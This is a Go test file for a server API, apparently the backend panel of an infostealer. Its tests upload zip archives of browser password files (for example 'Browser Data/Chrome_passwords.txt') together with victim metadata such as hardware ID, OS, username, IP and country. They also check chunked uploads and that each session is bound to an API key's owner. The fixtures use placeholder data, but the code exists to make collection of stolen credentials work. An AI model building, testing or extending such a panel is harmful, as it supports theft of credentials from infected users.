package api_test

import (
	"archive/zip"
	"bytes"
	"encoding/json"
	"mime/multipart"
	"net/http"
	"net/http/httptest"
	"strconv"
	"strings"
	"testing"
	"zialfi-panel/internal/testutil"
)

func createTestZip(t *testing.T, files map[string]string) []byte {
	t.Helper()
	var buf bytes.Buffer
	zw := zip.NewWriter(&buf)
	for name, content := range files {
		w, err := zw.Create(name)
		if err != nil {
			t.Fatal(err)
		}
		if _, err := w.Write([]byte(content)); err != nil {
			t.Fatal(err)
		}
	}
	zw.Close()
	return buf.Bytes()
}

func TestLogIngest_ValidArchive(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)

	fw, _ := mw.CreateFormFile("archive", "logs.zip")
	zipData := createTestZip(t, map[string]string{
		"Browser Data/Chrome_passwords.txt": "https://example.com\tuser\tpass",
	})
	fw.Write(zipData)
	mw.WriteField("metadata", `{"hwid":"hw1","os":"win10","username":"alice","ip":"1.2.3.4","country":"US"}`)
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["session_id"] == "" {
		t.Error("expected session_id in response")
	}
}

func TestIngest_BindsOwner(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("archive", "logs.zip")
	zipData := createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com	user	pass",
	})
	fw.Write(zipData)
	mw.WriteField("metadata", `{"hwid":"hw-owner","os":"win10","username":"alice","ip":"1.2.3.4","country":"US"}`)
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	if err := json.Unmarshal(w.Body.Bytes(), &resp); err != nil {
		t.Fatal(err)
	}
	if resp["session_id"] == "" {
		t.Fatal("expected session_id in response")
	}

	var ownerID string
	err := d.QueryRow("SELECT COALESCE(owner_id, '') FROM sessions WHERE id = $1", resp["session_id"]).Scan(&ownerID)
	if err != nil {
		t.Fatal(err)
	}
	if ownerID == "" {
		t.Error("expected session to be bound to the API key owner")
	}
}

func TestLogIngest_MissingArchive(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	mw.WriteField("metadata", "{}")
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestLogIngest_TooLarge(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	largeData := strings.Repeat("A", 101<<20)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("archive", "large.zip")
	fw.Write([]byte(largeData))
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusRequestEntityTooLarge {
		t.Fatalf("expected 413, got %d: %s", w.Code, w.Body.String())
	}
}

func TestLogIngest_NoAuth(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, _ := setupTestRouter(t, d, nil)

	req := httptest.NewRequest(http.MethodPost, "/api/log", nil)
	req.Header.Set("X-API-Key", "invalid-key-that-does-not-exist")
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusUnauthorized {
		t.Fatalf("expected 401, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestChunk_Complete(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	zipData := createTestZip(t, map[string]string{
		"passwords.txt": "https://example.com\tuser\tpass",
	})

	chunkSize := (len(zipData) + 2) / 3
	if chunkSize < 1 {
		chunkSize = 1
	}
	var chunks [][]byte
	for i := 0; i < 3; i++ {
		start := i * chunkSize
		end := start + chunkSize
		if i == 2 {
			end = len(zipData)
		}
		if start >= len(zipData) {
			break
		}
		chunks = append(chunks, zipData[start:end])
	}

	sessionID := "test-chunk-complete"

	for i, data := range chunks {
		var buf bytes.Buffer
		mw := multipart.NewWriter(&buf)
		fw, _ := mw.CreateFormFile("data", "chunk")
		fw.Write(data)
		mw.WriteField("session_id", sessionID)
		mw.WriteField("chunk_index", strconv.Itoa(i))
		mw.Close()

		req := httptest.NewRequest(http.MethodPost, "/api/log/chunk", &buf)
		req.Header.Set("Content-Type", mw.FormDataContentType())
		req.Header.Set("X-API-Key", apiKey)
		w := httptest.NewRecorder()
		r.ServeHTTP(w, req)

		if w.Code != http.StatusOK {
			t.Fatalf("chunk %d: expected 200, got %d: %s", i, w.Code, w.Body.String())
		}
	}

	form := "session_id=" + sessionID + "&total_chunks=" + strconv.Itoa(len(chunks)) + "&metadata=" + "{}"
	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", strings.NewReader(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusOK {
		t.Fatalf("expected 200, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["session_id"] == "" {
		t.Error("expected session_id")
	}
}

func TestChunk_MissingSession(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	form := "session_id=nonexistent&total_chunks=1"
	req := httptest.NewRequest(http.MethodPost, "/api/log/complete", strings.NewReader(form))
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}

func TestChunk_InvalidIndex(t *testing.T) {
	d := testutil.OpenTestDB(t)
	r, apiKey := setupLogsTestRouter(t, d)

	var buf bytes.Buffer
	mw := multipart.NewWriter(&buf)
	fw, _ := mw.CreateFormFile("data", "chunk")
	fw.Write([]byte("data"))
	mw.WriteField("session_id", "test-session")
	mw.WriteField("chunk_index", "-1")
	mw.Close()

	req := httptest.NewRequest(http.MethodPost, "/api/log/chunk", &buf)
	req.Header.Set("Content-Type", mw.FormDataContentType())
	req.Header.Set("X-API-Key", apiKey)
	w := httptest.NewRecorder()
	r.ServeHTTP(w, req)

	if w.Code != http.StatusBadRequest {
		t.Fatalf("expected 400, got %d: %s", w.Code, w.Body.String())
	}

	var resp map[string]string
	json.Unmarshal(w.Body.Bytes(), &resp)
	if resp["error"] == "" {
		t.Error("expected error message")
	}
}
